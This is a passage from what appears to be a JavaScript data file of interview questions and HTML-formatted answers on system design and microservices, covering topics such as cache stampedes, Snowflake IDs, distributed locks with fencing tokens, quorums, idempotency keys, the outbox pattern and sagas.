        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The key insight is to split metadata from the actual bytes: blobs go in object storage like S3, and a separate metadata service tracks the file tree, versions, sharing, and sync state. Files are chunked and each chunk is content-addressed by hash, which gives you deduplication, resumable uploads, and efficient delta sync where you only transfer changed chunks. Clients get pre-signed URLs straight to storage so bytes never flow through your app servers. Sync is the hard part — you need a change feed and conflict resolution for concurrent edits. The gotchas are large files, metadata consistency, and running permission checks on every share.</p></div>
<p>A cloud file storage system needs to handle file upload/download, syncing across devices, sharing, and versioning.</p>
<p><strong>Key components:</strong></p>
<pre>Architecture:
  [Client Apps] → [API Gateway] → [Metadata Service] → [Metadata DB]
       ↕                               ↓
  [Block Server] → [Object Storage (S3)]
       ↓
  [Sync Service] → [Notification Service] → [Other Clients]</pre>
<p><strong>1. File chunking (key insight!):</strong></p>
<pre>Instead of uploading a 1GB file as one piece:
  Split into 4MB chunks → upload each chunk separately

Benefits:
  - Resume interrupted uploads (only re-upload failed chunks)
  - Deduplication: if two users upload the same file, store chunks once
  - Delta sync: if 1 byte changes, only re-upload the affected chunk</pre>
<p><strong>2. Metadata:</strong></p>
<pre>Table: files
| file_id | user_id | name      | path    | size  | version |

Table: chunks
| chunk_id | file_id | chunk_order | hash    | storage_url |</pre>
<p><strong>3. Sync across devices:</strong></p>
<ul>
<li>Client keeps a local snapshot of file metadata</li>
<li>Periodically (or via WebSocket push) compare local vs server state</li>
<li>Download only changed chunks</li>
</ul>
<p><strong>4. Storage:</strong> Use object storage (AWS S3, GCS) — virtually unlimited, cheap, durable (99.999999999% durability).</p>
<p><strong>Example:</strong> Dropbox splits files into 4MB blocks, hashes each block, and only uploads blocks that changed. If you edit one paragraph in a 100MB document, only a 4MB chunk is synced.</p>
<div class="key-point">The magic is in <strong>chunking + deduplication + delta sync</strong>. This is what makes Dropbox fast even on slow connections.</div>`,
      },
      {
        q: 'What is a cache stampede (thundering herd) and how do you prevent it?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The problem is that when a hot key expires, thousands of concurrent requests all miss at once and stampede the database together. My go-to fix is a lock or single-flight: only one request recomputes the value while the others wait or serve stale, so the DB sees one query instead of ten thousand. Complementary tactics are probabilistic early expiration (one request refreshes just before the TTL), stale-while-revalidate, and jittering TTLs so keys don't expire in lockstep. For truly hot keys I'd pre-warm them or never let them expire passively. The related failure is cache penetration — misses for keys that don't exist — which a Bloom filter or negative caching handles.</p></div>
<p>A <strong>cache stampede</strong>: a popular cache key expires, and thousands of concurrent requests all miss at once and hit the database together — often taking it down. The nastiest version is self-inflicted: the DB slows, requests pile up, and the retry wave makes it worse.</p>
<pre>The scenario:
  key "home_feed" (10,000 req/s) expires at 12:00:00
  → 10,000 requests miss simultaneously
  → 10,000 identical queries slam the DB
  → DB melts, latency spikes, retries amplify the load</pre>
<p><strong>Defenses (combine several):</strong></p>
<ul>
<li><strong>Request coalescing / single-flight</strong>: only ONE request per key recomputes; the rest wait for its result (Go <code>singleflight</code>, a per-key mutex in Redis: <code>SET lock:key NX PX 3000</code>).</li>
<li><strong>Stale-while-revalidate</strong>: serve the expired value immediately, refresh in the background. Users see slightly stale data instead of an outage.</li>
<li><strong>Jittered TTL</strong>: <code>ttl = base + random(0, 10%)</code> so keys written together don't expire together.</li>
<li><strong>Early probabilistic refresh</strong>: each hit refreshes with a probability that grows as expiry approaches (XFetch algorithm) — the key never actually expires under load.</li>
<li><strong>Negative caching</strong>: cache "not found" results briefly so missing keys can't be used to bypass the cache.</li>
</ul>
<p><strong>Related: the hot key / celebrity problem</strong> — one key too popular for a single cache node (Bieber posts a photo):</p>
<pre>Fixes: local in-process cache (even 1s TTL absorbs most reads),
       replicate the key: feed:123#1..N on different nodes, pick randomly</pre>
<div class="key-point">Interviewers push on this after any "add a cache" answer. The senior move is naming the failure mode unprompted: "I'd add jittered TTLs and single-flight so we don't stampede the DB on expiry."</div>`,
      },
      {
        q: 'How do you generate unique IDs in a distributed system?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The tradeoff triangle is uniqueness, sortability, and coordination cost. UUIDv4 is trivial and coordination-free but random, so it's a poor database primary key (index fragmentation) and not sortable. My usual pick is a Snowflake-style ID: a 64-bit int packing timestamp, machine ID, and a sequence — roughly time-sortable, no per-ID coordination, and compact. The catch is you must assign unique machine IDs and you depend on clocks, so clock skew or an NTP rewind can bite. If you want sortable IDs without the machine-ID setup, ULID or UUIDv7 are the modern answer. Ticket servers and DB sequences work but reintroduce a central bottleneck.</p></div>
<p>Auto-increment doesn't work across many nodes. Classic trade-off question: uniqueness vs sortability vs coordination.</p>
<table><tr><th>Approach</th><th>Pros</th><th>Cons</th></tr>
<tr><td>UUID v4</td><td>No coordination, trivial</td><td>128-bit, random → terrible as B-tree PK (random inserts fragment the index), not time-sortable</td></tr>
<tr><td>DB auto-increment</td><td>Simple, sortable</td><td>SPOF, doesn't scale writes; multi-master offset trick (1,3,5.. / 2,4,6..) is brittle</td></tr>
<tr><td>Ticket server (Flickr)</td><td>Central control</td><td>Extra hop, needs HA pair</td></tr>
<tr><td>Snowflake</td><td>64-bit, time-sortable, no coordination per ID</td><td>Needs unique worker IDs, sensitive to clock skew</td></tr>
<tr><td>UUID v7 / ULID / KSUID</td><td>Time-ordered + random, index-friendly</td><td>128-bit (bigger than Snowflake)</td></tr>
</table>
<pre>Twitter Snowflake — 64 bits:
| 1 bit | 41 bits timestamp (ms) | 10 bits machine ID | 12 bits sequence |
  sign    ~69 years of ms         1024 workers          4096 IDs/ms/worker

= 4M+ IDs per second per worker, roughly time-sorted, fits in a BIGINT</pre>
<p><strong>The tricky follow-up — clock skew:</strong> what if the machine clock moves backward (NTP correction)? Snowflake generators must refuse to issue IDs (wait or error) until the clock catches up, otherwise duplicates. This is the detail interviewers fish for.</p>
<div class="key-point">Good default today: <strong>UUID v7</strong> (time-ordered, standardized, no infrastructure) or <strong>Snowflake</strong> when you need compact 64-bit sortable IDs. Mention why random UUIDv4 hurts clustered-index insert performance — that's the senior signal.</div>`,
      },
      {
        q: 'Is exactly-once delivery possible in distributed systems?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The trap is the word delivery — over an unreliable network you can't have exactly-once delivery, because the sender can never be certain its message or the ack arrived, so it must retry, which means duplicates. What you can achieve is exactly-once processing, or "effectively once": at-least-once delivery plus idempotent consumers or dedup on a unique message ID. So the real engineering is making the receiver idempotent, deduping by key, and using outbox and inbox patterns. Kafka's "exactly-once" is precisely this — idempotent producers plus transactional reads and writes within Kafka — not magic across arbitrary systems.</p></div>
<p>The trick question: <strong>exactly-once <em>delivery</em> is impossible</strong> over an unreliable network — but <strong>exactly-once <em>processing</em> (effectively-once)</strong> is achievable.</p>
<pre>Why delivery can't be exactly-once:
  Producer sends message → network timeout → was it received?
  - Don't retry → maybe ZERO deliveries (message lost)
  - Retry       → maybe TWO deliveries (it had arrived)
  You cannot distinguish "lost" from "slow ack". (Two Generals problem)</pre>
<p><strong>So real systems pick at-least-once + deduplication:</strong></p>
<pre>1. Producer: retry until acknowledged (at-least-once)
   + attach a stable message ID / idempotency key

2. Consumer: make processing IDEMPOTENT
   INSERT INTO processed_messages(message_id) VALUES (?)  -- unique constraint
   → duplicate arrives → constraint violation → skip, ack, move on

3. Or make the operation naturally idempotent:
   SET balance = 100        (idempotent — safe to repeat)
   vs balance = balance + 10 (NOT idempotent — must dedupe)</pre>
<p><strong>What about "Kafka exactly-once semantics (EOS)"?</strong> It's transactional: for Kafka→Kafka pipelines, consuming offsets and producing results commit <em>atomically</em>, so reprocessing isn't visible downstream. The moment you touch an external system (DB, email, payment API), you're back to needing idempotency on that system.</p>
<div class="key-point">Interview-ready answer: "Exactly-once delivery is impossible; we get effectively-once by combining at-least-once delivery with idempotent consumers — dedup table keyed by message ID, updated in the same transaction as the business change."</div>`,
      },
      {
        q: 'How do you implement a distributed lock? What can go wrong?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>A naive <code>SETNX</code> lock in Redis works until it doesn't, and the interview is really about the failure modes. First, always set an expiry so a crashed holder doesn't deadlock — but that creates the next problem: if your process pauses (GC, network) past the TTL, the lock expires, someone else grabs it, and now two clients believe they hold it. You mitigate with a fencing token — a monotonically increasing number the protected resource checks — so a stale holder's writes get rejected. Redlock across nodes exists but is controversial (Kleppmann's critique). The takeaway: distributed locks can't guarantee mutual exclusion under pauses, so prefer designs that don't need them — idempotency and fencing tokens.</p></div>
<p>Naive Redis lock, and the interview is about its failure modes:</p>
<pre>SET lock:order:42 &lt;token&gt; NX PX 30000   -- acquire: only if not exists, 30s TTL
-- release: must be atomic check-and-delete (Lua), only if WE still own it:
if redis.call("GET", key) == token then redis.call("DEL", key) end</pre>
<p><strong>The famous failure (Kleppmann's GC-pause scenario):</strong></p>
<pre>1. Client A acquires lock (TTL 30s)
2. A hits a 40s stop-the-world GC pause / network blip
3. Lock EXPIRES; client B acquires it and starts writing
4. A wakes up, still believes it holds the lock → writes too
→ TWO writers. The lock did not protect anything.</pre>
<p><strong>Fix: fencing tokens</strong> — the lock service hands out a monotonically increasing number; the protected resource rejects stale tokens:</p>
<pre>A gets lock with token 33 → pauses
B gets lock with token 34 → writes (storage records 34)
A wakes, writes with token 33 → storage: 33 &lt; 34 → REJECTED ✅</pre>
<ul>
<li><strong>Redis Redlock</strong> (quorum over N independent Redis nodes): controversial — Kleppmann showed it's unsafe under clock jumps/pauses without fencing. Fine for efficiency locks, not correctness locks.</li>
<li><strong>ZooKeeper / etcd</strong>: consensus-backed, ephemeral nodes + monotonic versions (natural fencing tokens) — the right tool when correctness matters.</li>
</ul>
<div class="key-point">Senior distinction: is the lock for <strong>efficiency</strong> (avoid duplicate work — a flaky lock is fine) or <strong>correctness</strong> (prevent data corruption — needs consensus + fencing)? Often the best answer is no lock at all: a unique constraint, conditional update (<code>WHERE version = ?</code>), or idempotency achieves the same goal without the distributed-lock minefield.</div>`,
      },
      {
        q: 'How do you do back-of-envelope capacity estimation in a system design interview?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>The interviewer wants to see a structured estimate, not a precise number, so I narrate the method and round hard. I start top-down: users, then requests per user per day, divided by roughly 10^5 seconds in a day to get average QPS, then multiplied by a peak factor of 2-10x. For storage I take writes per day times bytes per record times retention; for memory I estimate the hot working set to cache. The tricks that make it fast are memorizing round numbers — a day is about 100,000 seconds, 1M requests/day is about 10 QPS — and always splitting read vs write QPS, because they drive different parts of the design. The whole point is that the numbers then justify your architecture choices.</p></div>
<p>Interviewers want the <em>method</em>, not precision. Round aggressively to powers of 10.</p>
<pre>Numbers to memorize:
  1 day ≈ 86,400 s ≈ 10^5 s
  1M requests/day ≈ 12 req/s   (÷ 10^5)
  peak traffic ≈ 2–5× average
  char = 1 B, int/long = 4–8 B, UUID = 16 B, 1M × 1KB = 1 GB

Worked example — Twitter-like service:
  100M DAU, each writes 2 tweets, reads 100 tweets/day

  Write QPS : 100M × 2 / 10^5  = 2,000 /s   (peak ~5,000)
  Read QPS  : 100M × 100 / 10^5 = 100,000 /s (peak ~250,000)
  → read:write = 50:1 → design is READ-heavy → cache + fan-out strategy

  Storage: tweet ≈ 300 B metadata+text
  200M tweets/day × 300 B ≈ 60 GB/day ≈ 22 TB/year (×3 replication = 66 TB)
  10% have media (1 MB avg) → 20 TB/day of blobs → object storage + CDN

  Bandwidth: reads 100k/s × 300 B ≈ 30 MB/s API (media via CDN, not our servers)

  Cache (80/20 rule): 20% of daily reads hot
  10^10 reads × 20% × 300 B ≈ 600 GB → a handful of Redis nodes</pre>
<div class="key-point">The conclusions are the point, not the numbers: "read-heavy → cache aggressively", "media dominates storage → S3+CDN", "5k writes/s → a single well-tuned DB can't take 250k reads/s → replicas + cache". State assumptions out loud and sanity-check orders of magnitude.</div>`,
      },
      {
        q: 'What are quorum reads and writes (N, R, W)?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Quorums let you tune the consistency-availability slider per operation. With N replicas, if you require R read acks and W write acks, you get strong consistency when R + W &gt; N, because the read set and write set are guaranteed to overlap on at least one up-to-date replica. So W=N, R=1 favors fast reads; W=1, R=N favors fast writes; W=R=(N/2)+1 balances both. The subtlety is that R+W&gt;N alone isn't full linearizability — you still need read-repair and version vectors to resolve concurrent writes, and sloppy quorums with hinted handoff trade correctness for availability. It's the knob behind Dynamo, Cassandra, and Riak.</p></div>
<p>In leaderless replication (Dynamo, Cassandra), each value lives on <strong>N</strong> replicas. A write must be confirmed by <strong>W</strong> nodes, a read queries <strong>R</strong> nodes.</p>
<pre>The quorum condition:   R + W &gt; N
→ read set and write set MUST overlap
→ at least one node in every read has the latest write

N=3, W=2, R=2  (typical):  2+2 &gt; 3 ✅
  Write: send to 3 replicas, ack to client after 2 confirm
  Read : ask 3 (or 2) replicas, take the value with newest version

Tuning:
  W=1, R=3 → fast writes, expensive reads
  W=3, R=1 → slow writes, fast reads, write availability suffers
  W=1, R=1 → fast everything, R+W ≤ N → stale reads possible</pre>
<p><strong>Why quorums still aren't perfect (senior follow-ups):</strong></p>
<ul>
<li>Concurrent writes to different nodes → conflicts; need versioning (vector clocks) or last-write-wins (loses data on clock skew).</li>
<li><strong>Sloppy quorum + hinted handoff</strong>: during a partition, writes land on stand-in nodes and are handed back later — availability up, overlap guarantee temporarily broken.</li>
<li><strong>Read repair / anti-entropy</strong>: when a read sees divergent replicas, it writes the newest value back to stale ones.</li>
</ul>
<div class="key-point">Quorum ≠ strong consistency — it's tunable consistency. Cassandra exposes this per query: <code>QUORUM</code>, <code>ONE</code>, <code>LOCAL_QUORUM</code>, <code>ALL</code>. Knowing that R+W&gt;N gives overlap (not linearizability) is the distinction that separates senior answers.</div>`,
      },
      {
        q: 'How do you prevent double payment / double charging? (idempotency in practice)',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The scenario is a timeout on "Pay" and a retry, and the fix is idempotency, not clever locking. The client generates an idempotency key (a UUID) once per logical payment attempt and sends it on every retry; the server records that key with the result in the same transaction as the charge. First request: process and store the keyed result. Any retry with the same key: return the stored result instead of charging again. The details that matter are storing the key atomically with the effect so a mid-way crash is safe, a uniqueness constraint to win the race between concurrent retries, and passing the key through to the payment processor too. Stripe's API works exactly this way.</p></div>
<p>The scenario every payment interviewer asks: user clicks Pay, request times out, client (or user) retries. Was the first request processed? You must make the retry <strong>safe</strong>.</p>
<pre>1. Client generates an idempotency key ONCE per logical action
   (UUID created when the Pay button is rendered — NOT per HTTP attempt)

   POST /payments
   Idempotency-Key: 3f2a-...-9c1b
   { "orderId": 42, "amount": 99.00 }

2. Server — atomically claim the key BEFORE doing the work:
   INSERT INTO idempotency_keys (key, status, response)
   VALUES ('3f2a...', 'IN_PROGRESS', NULL);   -- UNIQUE constraint on key

   - insert OK        → first attempt → charge the card
                        → UPDATE ... SET status='DONE', response={...}
   - duplicate key    → status DONE        → return the SAVED response (no re-charge)
                      → status IN_PROGRESS → 409/retry-later (first attempt still running)

3. Downstream: pass the same key to the payment provider
   (Stripe/PayPal support Idempotency-Key natively → dedupe on their side too)</pre>
<p><strong>Details that mark a senior answer:</strong></p>
<ul>
<li>The dedupe check and the business write must be in the <strong>same DB transaction</strong> — check-then-act across two systems reintroduces the race.</li>
<li>Key includes/binds the request payload hash — same key with different amount is an error, not a replay.</li>
<li>Keys expire (e.g. 24h) so storage doesn't grow forever.</li>
<li>Timeout ambiguity: on timeout the client must retry with the <strong>same key</strong> — retrying with a fresh key is exactly how double charges happen.</li>
</ul>
<div class="key-point">Pattern generalizes to any non-idempotent POST: unique constraint claims the operation, the stored response makes replays return identical results. "The database's unique constraint is doing the distributed coordination" is the key insight.</div>`,
      },
    ],
  },

  // ───────────────────────── ALGORITHMS & DATA STRUCTURES ─────────────────────────
  // ========================= MICROSERVICES =========================,
  {
    id: 'microservices',
    name: 'Microservices',
    icon: '🧩',
    questions: [
      {
        q: 'What is microservice architecture and when should you choose it?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Microservices break a system into independently deployable services, each owning one business capability — and the real driver is organizational, letting many teams ship without stepping on each other (Conway's law). You choose it when you have that team-scaling pressure or genuinely divergent scaling and technology needs, not because it's fashionable. The costs are steep: network latency, distributed data, eventual consistency, and a heavy operational tax in observability, CI/CD, and on-call. My strong default is to start with a modular monolith and extract services along proven seams. The failure mode to avoid is a distributed monolith — services that still have to deploy together.</p></div>
<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
<pre>Monolith:
  [One Big App: Users + Orders + Payments + Notifications]

Microservices:
  [User Service] ←REST/gRPC→ [Order Service] ←events→ [Payment Service]
       ↓                           ↓                        ↓
  [User DB]                   [Order DB]               [Payment DB]</pre>
<p><strong>When to choose microservices:</strong></p>
<ul>
<li>Large system with multiple autonomous teams</li>
<li>Different parts need different scaling (e.g., search vs checkout)</li>
<li>Independent release cycles are critical</li>
<li>Different tech stacks needed per service</li>
</ul>
<p><strong>When NOT to choose:</strong></p>
<ul>
<li>Small team (&lt;10 developers)</li>
<li>Early-stage product where requirements change fast</li>
<li>Simple CRUD applications</li>
</ul>
<div class="key-point">Start with a well-structured monolith. Extract microservices only when the organizational or scaling pressure is real. Premature microservices is a common and expensive mistake.</div>`,
      },
      {
        q: 'What is service discovery in microservices?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>In a dynamic environment instances come and go constantly — autoscaling, deploys, failures — so hard-coded IPs are dead on arrival; service discovery is how a caller finds a healthy instance at runtime. There are two models: client-side, where the client queries a registry like Consul or Eureka and load-balances itself, and server-side, where it hits a stable endpoint (a load balancer or DNS) that does the routing. In Kubernetes this is mostly solved for you — a Service gives a stable DNS name and virtual IP fronting healthy pods. The linchpin is health checking: the registry must evict unhealthy instances fast or you route to dead nodes. The gotcha is stale entries and a registration storm on mass restart.</p></div>
<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
<pre>Without service discovery:
  Order Service → http://10.0.1.5:8080/payments  (hardcoded, breaks on scale)

With service discovery:
  Order Service → "payment-service" → Registry resolves → http://10.0.1.5:8080
                                                         or http://10.0.1.6:8080</pre>
<p><strong>Two patterns:</strong></p>
<ul>
<li><strong>Client-side discovery</strong>: Client queries a registry (Eureka, Consul) and picks an instance itself. More control, more complex client.</li>
<li><strong>Server-side discovery</strong>: Client talks to a load balancer/DNS that resolves the target. Simpler client.</li>
</ul>
<pre>// Spring Cloud example (client-side with Eureka):
@FeignClient(name = "payment-service")
public interface PaymentClient {
    @PostMapping("/charge")
    PaymentResult charge(@RequestBody PaymentRequest req);
}
// Eureka resolves "payment-service" to an available instance</pre>
<div class="key-point">In Kubernetes, service discovery is built-in via DNS. <code>payment-service.default.svc.cluster.local</code> resolves automatically. No need for a separate registry.</div>`,
      },
      {
        q: 'What is the difference between synchronous and asynchronous communication between services?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Synchronous — REST or gRPC — is a request the caller blocks on; asynchronous — via a broker like Kafka or SQS — is fire-and-forget with the result arriving later or as an event. Sync is simpler to reason about and gives an immediate answer, but it creates temporal coupling: if the callee is down or slow, so is the caller, and chains of sync calls multiply latency and failure probability. Async decouples services in time and smooths load, at the cost of eventual consistency and harder debugging. My rule: sync for queries that need an immediate answer, async for commands and anything that can happen in the background. The trap is a deep synchronous call chain — a distributed monolith waiting to cascade.</p></div>
<ul>
<li><strong>Synchronous</strong>: Caller sends request and <strong>waits</strong> for response. REST, gRPC.</li>
<li><strong>Asynchronous</strong>: Caller sends message and <strong>continues</strong> without waiting. Kafka, RabbitMQ, SQS.</li>
</ul>
<pre>// Synchronous: Order → waits → Payment response
POST /api/payments  → { status: "charged" }  // blocks until response

// Asynchronous: Order → publishes event → continues
publish("order.created", { orderId: 123 })
// Payment service consumes event independently
// Order service gets result later via another event</pre>
<table><tr><th>Aspect</th><th>Synchronous</th><th>Asynchronous</th></tr>
<tr><td>Latency</td><td>Caller blocked</td><td>Caller free</td></tr>
<tr><td>Coupling</td><td>Tight (both must be up)</td><td>Loose (queue buffers)</td></tr>
<tr><td>Debugging</td><td>Easier (request-response)</td><td>Harder (event chains)</td></tr>
<tr><td>Use case</td><td>Need immediate answer</td><td>Background processing</td></tr></table>
<div class="key-point">Use synchronous for user-facing operations that need immediate results. Use asynchronous for background workflows, notifications, and inter-service decoupling.</div>`,
      },
      {
        q: 'Why is database-per-service important in microservices?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Database-per-service is the rule that makes microservices actually independent — if two services share a database they're coupled at the schema level and can't deploy or scale separately, which is a distributed monolith. Owning your data also lets each service pick the right store (polyglot persistence) and enforces clean API boundaries, since the only way in is through the service. The price is that cross-service joins and transactions disappear, so you use API composition, replicated CQRS read models, and sagas for writes. The hardest part in practice is untangling a shared database during migration and resisting the urge to "just query the other service's tables."</p></div>
<p>Each service should own its own database so schema changes and deployments stay independent.</p>
<pre>❌ Shared database (distributed monolith):
  Order Service ──→ [Shared DB] ←── Payment Service
  (Schema change in orders table can break payment service!)

✅ Database per service:
  Order Service → [Order DB]
  Payment Service → [Payment DB]
  (Each team controls their own schema)</pre>
<ul>
<li><strong>Benefits</strong>: Independent deployments, technology freedom (SQL for orders, NoSQL for catalog), clear ownership.</li>
<li><strong>Challenges</strong>: Cross-service queries become harder (no JOINs), data consistency requires patterns (Saga, Event Sourcing).</li>
</ul>
<p><strong>How to query across services:</strong></p>
<ul>
<li>API composition: aggregate data from multiple service APIs</li>
<li>CQRS: maintain read-optimized views materialized from events</li>
<li>Data replication: each service caches what it needs from others</li>
</ul>
<div class="key-point">If multiple services directly write the same tables, you usually have a distributed monolith — all the complexity of microservices with none of the benefits.</div>`,
      },
      {
        q: 'What is the BFF pattern in microservices?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>A BFF is a dedicated API layer per client type — web, mobile, TV — that aggregates and reshapes downstream services for exactly that client's needs. It exists because a one-size-fits-all API forces mobile to over-fetch and make chatty round-trips, and because client-specific logic becomes a battleground in a shared gateway. Each frontend team owns its BFF, keeping client concerns out of the core services. The tradeoff is some duplicated aggregation across BFFs, and you have to stop the BFF from swelling into a mini-monolith with business logic that belongs downstream. GraphQL is one common way to implement the aggregation.</p></div>
<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
<pre>Without BFF:
  Mobile App ──→ [Generic API] ←── Web App
  (Mobile gets too much data, web gets too little)

With BFF:
  Mobile App → [Mobile BFF] → services (optimized payloads, fewer calls)
  Web App → [Web BFF] → services (richer data, parallel fetching)
  Admin → [Admin BFF] → services (bulk operations, different auth)</pre>
<p><strong>Benefits:</strong></p>
<ul>
<li>Each client gets exactly the data shape it needs</li>
<li>Reduces over-fetching and under-fetching</li>
<li>Client-specific logic stays out of core services</li>
<li>Each frontend team owns their BFF</li>
</ul>
<pre>// Mobile BFF: lightweight response
GET /mobile/product/123
→ { name, price, thumbnailUrl }

// Web BFF: rich response
GET /web/product/123
→ { name, price, images[], reviews[], relatedProducts[], specs }</pre>
<div class="key-point">BFF is especially useful when web and mobile need very different payload shapes. Consider GraphQL as an alternative that can serve multiple clients from one endpoint.</div>`,
      },
      {
        q: 'What is idempotency and why is it important in distributed systems?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Idempotency means doing the operation N times has the same effect as doing it once — and it isn't a nicety, it's mandatory, because networks force retries and every retry risks a duplicate. HTTP-wise GET, PUT, and DELETE are naturally idempotent while POST isn't, which is why create endpoints take an idempotency key the client generates once and reuses on retries, and the server dedupes on it. The implementation detail that matters is storing the key and result atomically with the side effect, so a crash between doing the work and recording the key can't double-charge. It's the foundation under safe retries, at-least-once messaging, and exactly-once processing.</p></div>
<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
<pre>// Idempotent: safe to retry
PUT /users/123 { name: "John" }  → Always sets name to "John"
DELETE /orders/456               → First call deletes, retries return 404

// NOT idempotent: dangerous to retry
POST /payments { amount: 100 }   → Each call creates a NEW payment!
POST /orders                     → Each call creates a NEW order!</pre>
<p><strong>How to make non-idempotent operations safe:</strong></p>
<pre>// Idempotency key pattern:
POST /payments
Headers: Idempotency-Key: "abc-123-unique"
Body: { amount: 100 }

// Server: check if "abc-123-unique" was already processed
if (exists(idempotencyKey)) {
    return cachedResponse;  // same result, no duplicate charge
}
// First time: process payment, store key + response</pre>
<p><strong>Why it matters:</strong></p>
<ul>
<li>Networks fail: timeouts, retries happen automatically</li>
<li>Message queues may deliver the same message twice</li>
<li>Load balancers may send duplicate requests</li>
</ul>
<div class="key-point">Retries are normal in distributed systems. Idempotency is what keeps retries safe. Stripe, PayPal, and all payment APIs require idempotency keys.</div>`,
      },
      {
        q: 'What is distributed tracing and why do correlation IDs matter?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Once a request hops across a dozen services a stack trace is useless — distributed tracing reconstructs the whole journey as a tree of spans so you can see where latency and errors actually live. The mechanism is a trace/correlation ID generated at the edge and propagated through every call via headers (W3C Trace Context is the standard), with each service adding spans. Correlation IDs matter because they also stitch your logs together across services for one request — without them, debugging is archaeology. I'd standardize on OpenTelemetry exporting to something like Jaeger or Tempo. The gotcha is propagation gaps: one service that drops the header breaks the trace, and your sampling strategy decides what you can even see.</p></div>
<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
<pre>User request: GET /checkout
  ↓
  [API Gateway] (2ms)
  ├── [Order Service] (15ms)
  │   ├── [Inventory Service] (8ms)
  │   └── [Pricing Service] (5ms)
  └── [Payment Service] (200ms) ← bottleneck!
      └── [Fraud Check Service] (180ms) ← root cause!

Trace ID: abc-123 (links ALL spans across services)
Span 1: API Gateway → Order Service (15ms)
Span 2: Order Service → Inventory Service (8ms)
Span 3: Order Service → Pricing Service (5ms)
Span 4: API Gateway → Payment Service (200ms)</pre>
<p><strong>Implementation:</strong></p>
<pre>// Propagate trace ID in headers
GET /inventory/check
Headers:
  X-Trace-Id: abc-123
  X-Span-Id: span-456
  X-Parent-Span-Id: span-123

// Log with correlation ID
logger.info("[trace=abc-123] Checking inventory for item 789")</pre>
<p><strong>Tools:</strong> Jaeger, Zipkin, AWS X-Ray, Datadog APM, OpenTelemetry (standard)</p>
<div class="key-point">Without trace/correlation IDs, debugging latency in microservices is like finding a needle in a haystack. OpenTelemetry is the emerging standard — invest in it early.</div>`,
      },
      {
        q: 'What is the Strangler Fig pattern in microservice migration?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Strangler Fig is how you rewrite a monolith without a big-bang cutover — you put a proxy or facade in front, then peel off one feature at a time into new services, routing that traffic to the new code while everything else still hits the monolith. Over time the new system strangles the old one until it can be retired. The appeal is that it's incremental and reversible: each slice is small, you can roll back per route, and you never take the scary all-or-nothing leap. The gotchas are running two systems in parallel — data sync and a shared database during the transition — and having the discipline to actually finish, because half-strangled migrations that stall for years are common.</p></div>
<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
<pre>Phase 1: All traffic goes to monolith
  [Users] → [Monolith: Auth + Orders + Reports + Users]

Phase 2: Extract Reports service
  [Users] → [Router/Proxy]
              ├── /reports → [New Reports Service] ✅
              └── /* → [Monolith: Auth + Orders + Users]

Phase 3: Extract Orders service  
  [Users] → [Router/Proxy]
              ├── /reports → [Reports Service] ✅
              ├── /orders → [New Orders Service] ✅
              └── /* → [Monolith: Auth + Users]

Phase N: Monolith is empty → decommission it</pre>
<p><strong>Key steps:</strong></p>
<ol>
<li>Put a proxy/API gateway in front of the monolith</li>
<li>Build new features as separate services</li>
<li>Gradually route traffic from monolith to new services</li>
<li>Keep both running in parallel for rollback safety</li>
</ol>
<div class="key-point">Named after the strangler fig tree that grows around a host tree, eventually replacing it. This is far safer than a "big bang" rewrite — you can stop at any point and still have a working system.</div>`,
      },
      {
        q: 'What is the Transactional Outbox pattern?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The outbox solves the dual-write problem: you can't atomically write to your database and publish to a broker, because they're two systems with no shared transaction. So instead, in the same local DB transaction that changes your state, you insert the event into an outbox table — now they commit or fail together. A separate relay then reads the outbox and publishes to the broker, marking rows sent, usually via change data capture like Debezium or a polling worker. This gives at-least-once publishing, so consumers must be idempotent. The gotcha is ordering and the relay's own reliability, but it beats the alternative of lost or phantom events.</p></div>
<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
<pre>// The problem: dual-write inconsistency
1. Save order to DB ✅
2. Publish "OrderCreated" to Kafka ❌ (network error!)
→ Order exists but no event → downstream services never know!

// Solution: Transactional Outbox
1. In ONE database transaction:
   - Save order to orders table
   - Save event to outbox table
2. A separate worker polls outbox and publishes to Kafka
3. After successful publish, mark outbox row as sent

Table: outbox
| id | event_type    | payload              | published | created_at  |
| 1  | OrderCreated  | {"orderId": 123, ...}| false     | 2024-01-01  |</pre>
<pre>// Using Change Data Capture (CDC) — even better:
// Debezium reads DB transaction log → publishes to Kafka
// No polling needed, near real-time</pre>
<div class="key-point">The outbox pattern guarantees at-least-once delivery. Consumers must be idempotent. CDC with Debezium is the modern approach — no polling overhead.</div>`,
      },
      {
        q: 'What is the Saga pattern?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>A saga gets you a multi-service business transaction without a distributed transaction: break it into local transactions, one per service, and for each step define a compensating action that semantically undoes it if a later step fails. Two flavors: choreography, where services react to each other's events — decentralized and simple for short flows but hard to follow as it grows — and orchestration, where a central coordinator drives the steps, which is clearer but adds a component. The mental shift is that you don't get rollback, you get compensation, which is a business action like issuing a refund. The gotchas are no isolation (intermediate states are visible) and making compensations idempotent and reliable.</p></div>
